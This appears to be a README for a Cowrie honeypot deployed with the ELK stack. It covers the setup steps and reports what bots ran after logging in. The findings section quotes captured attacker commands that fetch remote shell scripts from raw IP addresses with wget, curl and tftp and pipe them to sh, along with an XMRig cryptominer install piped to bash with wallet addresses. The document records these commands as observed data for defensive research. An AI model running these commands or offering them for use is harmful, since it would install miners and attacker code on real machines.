# custom cowrie installation with ELK stack

Installation based on:

https://github.com/cowrie/cowrie

"Cowrie is a medium to high interaction SSH and Telnet honeypot designed to log brute force attacks and the shell interaction performed by the attacker. In medium interaction mode (shell) it emulates a UNIX system in Python, in high interaction mode (proxy) it functions as an SSH and telnet proxy to observe attacker behavior to another system."

This repo shows the custom configuration I used to setup the "ELK Stack" (Elasticsearch, Logstash and Kibana = ELK) together with Cowrie, since some steps were not covered by the official documentation.

Access to the ELK stack was realized by ssh port forwarding local ports.

## installation steps for ELK stack not covered by tutorial

original instructions:

https://cowrie.readthedocs.io/en/latest/elk/README.html

nginx was not needed, since only ssh port forwarding was used to access kibana!

### jvm configurations

jvm specs had to be reduced to work on a "weak" machine, see configs, e.g. in the [jvm.options](etc/logstash/jvm.options) file and the 
[reduceram.options](etc/elasticsearch/jvm.options.d/reduceram.options) file,
e.g. only using

```
-Xms512m
-Xmx512m
```

### ufw (uncomplicated firewall)

to avoid accidentally serving any misconfigured ports, ufw was used to protect the machine running Cowrie and the ELK stack.

allow the "fake" ssh port and "fake" telnet port served by cowrie (don't forget to also add your real ssh port - do not lock yourself out of your server)
```
apt update && apt upgrade -y && apt install -y ufw && \
ufw allow 22/tcp  && \
ufw allow 23/tcp  && \
ufw enable 
```

### give correct rights to logstash

for logstash to work correctly, the following commands should be used:

```
mkdir /usr/share/logstash/logs && \
chown logstash:logstash /usr/share/logstash/logs && \
mkdir /usr/share/logstash/data && \
chown logstash:logstash /usr/share/logstash/data
```

### start services

```service elasticsearch start; service logstash start; service filebeat start; service kibana start```

### stop services

```service elasticsearch stop; service logstash stop; service filebeat stop; service kibana stop```

### make Cowrie resemble Raspberry Pi at login

[cowrie.cfg](home/cowrie/cowrie/etc/cowrie.cfg) shows which settings were used to resemble a Raspberry Pi ssh banner.

[userdb.txt](home/cowrie/cowrie/etc/userdb.txt) is also showing the used default Raspberry Pi login credentials.

### start cowrie as user cowrie and watch logs every 10 seconds

```
sudo su - cowrie
/home/cowrie/cowrie/bin/cowrie start
watch -n 10 tail /home/cowrie/cowrie/var/log/cowrie/cowrie.json
```

when the rest of the original instructions were followed, you could see the log data of Cowrie visualized in Kibana.

## Some interesting findings while using cowrie

If one looks at the logs of what bots tried to run after a successfull login via ssh, one can see, that most try to install some crypto miners (like shown in most of the honeypot research papers), e.g. for monero.

Some examplary commands, resulting from running ```grep -r "cowrie.command.input" | cut -d ':' -f2- | jq .input | tr -d '"'``` on all the json-log files, which searches for all events where something/someone logged in entered a command into Cowrie:

```
uname -a
cat /proc/cpuinfo
ps | grep '[Mm]iner'
ps -ef | grep '[Mm]iner'
ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
echo Hi | cat -n
wget -qO - http://71.127.148.69/.x/1sh | sh > /dev/null 2>&1 &
rm -rf /var/run/1sh; wget -c http://71.127.148.69/.x/1sh -P /var/run && sh /var/run/1sh &
wget -qO - http://71.127.148.69/.x/2sh | sh > /dev/null 2>&1 &
rm -rf /tmp/2sh; wget -c http://71.127.148.69/.x/2sh -P /tmp && sh /tmp/2sh &
curl http://71.127.148.69/.x/3sh | sh
cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &
```

Interesting here is e.g. the 4th and 5th command, where apparently the script checks if there is already a running process which contains the name "Miner" or "miner".


Another result, going in the same direction: ```grep -r "cowrie.command.input" | cut -d ':' -f2- | jq .input | tr -d '"' | grep -i miner```

```
uname -a; cd /tmp; curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA; wget http://179.43.175.170/putkite/quickr1n.sh; curl -O http://179.43.175.170/putkite/quickr1n.sh; chmod 777 *; sh quickr1n.sh; echo storytimeDedicated
curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 45dNkjTQGgT77r9AEMyHdCGan5tpuekXaHFhFW99dQ8hUS35oZQEYXddFE52jxVdfUNrAD4ZyZ44BgHfgk5SjHdoLjGdJnQ
```

Since also the downloaded files are saved by Cowrie, one can see, that some are shell scripts, but some are also binary executables:

Result of ```find ./ -type f -exec sh -c "file --brief {}" \;``` in the folder containing the Cowrie downloads:

```
data
ASCII text, with CRLF line terminators
data
empty
data
data
data
OpenSSH RSA public key
data
data
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
data
data
ASCII text
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped
data
data
ASCII text
ASCII text
data
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped
```
Where "data" and "ASCII" text are scripts or shell commands.


Also, the following well known Raspi malware was seen in the Downloads:

https://www.virustotal.com/gui/file/6d1fe6ab3cd04ca5d1ab790339ee2b6577553bc042af3b7587ece0c195267c9b/community
